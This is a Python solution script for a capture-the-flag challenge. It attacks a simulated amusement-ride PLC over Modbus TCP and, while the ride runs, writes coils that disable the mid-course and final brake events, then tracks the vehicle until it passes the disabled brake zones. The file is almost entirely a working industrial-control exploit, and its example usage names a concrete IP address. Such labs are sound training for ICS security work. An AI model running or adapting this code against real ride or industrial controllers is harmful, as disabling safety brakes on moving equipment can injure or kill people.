#!/usr/bin/env python3
"""
CTF Challenge 7: Event Disable
Difficulty: Medium
Points: 200

Objective: Disable specific ride events while the ride is running to skip attractions.

Solution:
- Events can be controlled individually via coils 8-16
- Disable events before the vehicle reaches their trigger zones
- The vehicle must pass through the event zones while the events are disabled
- Event 5 (Mid-Course Brake) triggers at position 12
- Event 7 (Final Brake) triggers at position 18
"""

import sys
import time
from pymodbus.client import ModbusTcpClient

def main():
    if len(sys.argv) < 2:
        print("Usage: python3 challenge_07_event_disable.py <PLC_IP> [PORT]")
        print("Example: python3 challenge_07_event_disable.py 134.199.202.235 502")
        sys.exit(1)

    plc_ip = sys.argv[1]
    plc_port = int(sys.argv[2]) if len(sys.argv) > 2 else 502

    print(f"[*] CTF Challenge 7: Event Disable")
    print(f"[*] Connecting to PLC at {plc_ip}:{plc_port}")

    client = ModbusTcpClient(plc_ip, port=plc_port)

    if not client.connect():
        print("[!] Failed to connect to PLC")
        sys.exit(1)

    print("[+] Connected successfully")

    # Check if ride is running
    print("[*] Checking ride state...")
    state_result = client.read_holding_registers(1039, 1)  # MW15 = state
    if state_result.isError():
        print("[!] Failed to read state")
        client.close()
        sys.exit(1)

    current_state = state_result.registers[0]
    print(f"[*] Current state: {current_state} (0=IDLE, 1=STARTING, 2=RUNNING)")

    if current_state != 2:
        print("[!] Ride must be RUNNING (state=2) for this challenge")
        print("[!] Start the ride first using the HMI")
        client.close()
        sys.exit(1)

    # Read current event states
    print("[*] Reading current event enable states...")
    events_result = client.read_coils(8, 9)  # Events 1-9 (coils 8-16)
    if not events_result.isError():
        print("[*] Current event states:")
        for i, status in enumerate(events_result.bits[:9], 1):
            print(f"    Event {i}: {'ENABLED' if status else 'DISABLED'}")

    # ATTACK: Disable Event 5 (Mid-Course Brake) and Event 7 (Final Brake)
    print("\n[*] Executing attack: Disabling Event 5 (Mid-Course Brake)...")
    result1 = client.write_coil(12, False)  # event_5_enable

    if result1.isError():
        print("[!] Failed to disable Event 5")
        client.close()
        sys.exit(1)

    print("[+] Event 5 disabled successfully!")

    print("[*] Disabling Event 7 (Final Brake)...")
    result2 = client.write_coil(14, False)  # event_7_enable

    if result2.isError():
        print("[!] Failed to disable Event 7")
        client.close()
        sys.exit(1)

    print("[+] Event 7 disabled successfully!")
    print("[*] Waiting for vehicle to pass through event zones...")
    print("[*] Event 5 zone: position 12, Event 7 zone: position 18")

    # Wait for vehicle to pass through both event zones
    events_bypassed = {5: False, 7: False}
    last_position = -1
    timeout = 90  # 90 second timeout for full lap
    start_time = time.time()

    while (not all(events_bypassed.values())) and (time.time() - start_time) < timeout:
        # Read current position
        pos_result = client.read_holding_registers(1, 1)  # current_position
        if not pos_result.isError():
            current_pos = pos_result.registers[0]

            # Print position updates
            if current_pos != last_position:
                print(f"\r[*] Vehicle position: {current_pos} | Event 5: {'✓' if events_bypassed[5] else '○'} | Event 7: {'✓' if events_bypassed[7] else '○'}", end="", flush=True)
                last_position = current_pos

            # Event 5 (Mid-Course Brake) triggers at position 12
            if current_pos == 12 and not events_bypassed[5]:
                verify = client.read_coils(12, 1)  # event_5_enable
                if not verify.isError() and not verify.bits[0]:
                    events_bypassed[5] = True
                    print(f"\n[+] Vehicle at Event 5 zone (position {current_pos}) - Event is DISABLED!")

            # Event 7 (Final Brake) triggers at position 18
            if current_pos == 18 and not events_bypassed[7]:
                verify = client.read_coils(14, 1)  # event_7_enable
                if not verify.isError() and not verify.bits[0]:
                    events_bypassed[7] = True
                    print(f"\n[+] Vehicle at Event 7 zone (position {current_pos}) - Event is DISABLED!")

        time.sleep(0.2)

    if all(events_bypassed.values()):
        print("\n\n[+] Challenge condition met!")
        print("[*] Vehicle passed through both event zones while events were disabled")
        print("[*] Check the web interface for flag capture notification")
    else:
        print("\n\n[!] Timeout or events were not properly bypassed")
        print(f"[!] Event 5 bypassed: {events_bypassed[5]}, Event 7 bypassed: {events_bypassed[7]}")

    client.close()

if __name__ == "__main__":
    main()
